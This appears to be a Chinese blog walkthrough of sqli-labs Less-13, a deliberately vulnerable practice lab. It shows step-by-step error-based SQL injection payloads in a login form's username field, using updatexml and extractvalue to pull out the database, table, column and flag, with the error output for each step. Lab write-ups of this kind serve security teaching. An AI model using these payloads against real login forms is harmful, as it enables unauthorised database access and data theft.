# 原创
：  less-13 in sqli-labs

# less-13 in sqli-labs

**Less-13 报错注入【 ') 】**

1、注入点判断：`uname=admin\&amp;passwd=Dumb`

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'Dumb') LIMIT 0,1' at line 1

```

**updataxml版本**<br/> 2、进行报错注入得到数据库名：`uname=admin') and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;passwd=Dumb`

```
XPATH syntax error: '~security~'


```

3、进行报错注入得到表名：`uname=admin') and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e),1)#&amp;passwd=Dumb`

```
XPATH syntax error: '~hermesflag~'

```

4、进行报错注入得到列名：`uname=admin') and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='hermesflag' limit 1,1),0x7e),1)#&amp;passwd=Dumb`

```
XPATH syntax error: '~flag~'

```

5、进行报错注入得到数据：`uname=admin') and updatexml(1,concat(0x7e,(select concat(id,0x7e,flag) from hermesflag),0x7e),1)#&amp;passwd=Dumb`

```
XPATH syntax error: '~1~flag{327a6c4304ad5938eaf0efb6'

```

**extractvalue版本**<br/> 2、进行报错注入得到数据库名：`uname=admin') and extractvalue(1,concat(0x7e,(select database()),0x7e))#&amp;passwd=Dumb`

```
XPATH syntax error: '~security~'

```

3、进行报错注入得到表名：`uname=admin') and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e))#&amp;passwd=Dumb`

```
XPATH syntax error: '~hermesflag~'

```

4、进行报错注入得到列名：`uname=admin') and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='hermesflag' limit 1,1),0x7e))#&amp;passwd=Dumb`

```
XPATH syntax error: '~flag~'

```

5、进行报错注入得到数据：`uname=admin') and extractvalue(1,concat(0x7e,(select concat(id,0x7e,flag) from hermesflag limit 0,1),0x7e))#&amp;passwd=Dumb`

```
XPATH syntax error: '~1~flag{327a6c4304ad5938eaf0efb6'

```
